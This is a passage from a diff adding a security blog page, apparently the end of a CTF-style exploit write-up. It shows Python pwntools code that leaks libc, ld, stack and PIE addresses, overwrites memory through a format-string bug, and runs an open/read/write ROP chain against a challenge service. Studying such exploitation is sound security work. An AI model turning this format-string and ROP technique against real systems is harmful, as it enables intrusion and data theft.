+<span class="n">leak</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x270b3</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">pie</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1440</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ld : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ld</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"pie : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pie</span><span class="p">))</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">pivot</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'SHOUT '</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">53</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">((</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="n">i</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">54</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x5f</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span> <span class="o">+</span> <span class="s">'B'</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ld</span> <span class="o">+</span> <span class="mh">0x1948</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+<span class="n">pause</span><span class="p">()</span>
+
+<span class="n">prbp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x00000000000256c0</span>
+<span class="n">prax</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x000000000004a550</span>
+<span class="n">prdi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000026b72</span>
+<span class="n">prsi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000027529</span>
+<span class="n">prdxp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000162866</span>
+<span class="n">lr</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x000000000005aa48</span>
+<span class="n">read</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x111130</span>
+<span class="n">_open</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x110e50</span>
+<span class="n">syscall</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x111140</span>
+<span class="n">write</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1111d0</span>
+<span class="n">writable</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1ee000</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x228</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pie</span> <span class="o">+</span> <span class="mh">0x31C1</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+   </div>
+</div>
+
+
+  <!-- Start disqus 
+<script src="/assets/js/disqusLoader.js" /></script>
+<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
+<div class="disqus"></div>
+<script>
+    disqusLoader('.disqus', {
+        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
+    });
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+End disqus -->
+
+
+<div class="pagination">
+  
+   <a href="/2020-10-01/Oracle-WebLogic-Deserialization-(CVE-2020-2883)" class="left arrow">&#8592;</a>
+  
+  
+   <a href="/2020-10-01/Hide-JavaScript-Code-in-PNG-1d24960c8d174fce8729f7f8003fce4b" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+    </main>
+
+    <!--footer>
+  <span>
+    &copy; <time datetime="2020-10-13 11:20:23 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+  </span>
+</footer-->
+
+  </body>
+</html>
